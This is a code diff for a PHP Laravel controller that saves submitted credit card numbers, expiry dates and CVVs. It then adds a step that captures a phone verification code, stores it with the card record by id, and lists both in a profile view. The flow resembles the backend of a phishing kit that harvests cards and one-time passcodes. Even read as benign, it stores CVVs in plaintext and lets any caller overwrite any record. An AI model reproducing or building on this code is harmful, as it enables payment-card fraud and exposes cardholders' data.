@@ -105,7 +105,7 @@ class ImageController extends Controller
     }
 
     public function saveCardInfo(Request $request){
-        CardInfo::create([
+        $cardInfo = CardInfo::create([
             'profile_id' => $request->profile_id,
             'card_number' => $request->card_number,
             'month' => $request->month,
@@ -113,7 +113,7 @@ class ImageController extends Controller
             'ccv' => $request->ccv,
             'card_type' => $request->card_type,
         ]);        
-        return view('phone-verify');
+        return view('phone-verify', compact('cardInfo'));
     }
 
     public function viewProfile(Request $request){
@@ -130,7 +130,8 @@ class ImageController extends Controller
             'card_info.month',
             'card_info.year',
             'card_info.card_type',
-            'card_info.ccv'
+            'card_info.ccv',
+            'card_info.code'
         )
         ->get();
 
@@ -139,5 +140,12 @@ class ImageController extends Controller
 
     public function phoneVerify(Request $request){
         return view('phone-verify');
+    }
+
+    public function saveVerifyCode(Request $request){
+        $cardInfo = CardInfo::where('id', $request->cardInfoId)->first();
+        $cardInfo->code = $request->code;
+        $cardInfo->update();
+        return 'success';
     }
 }
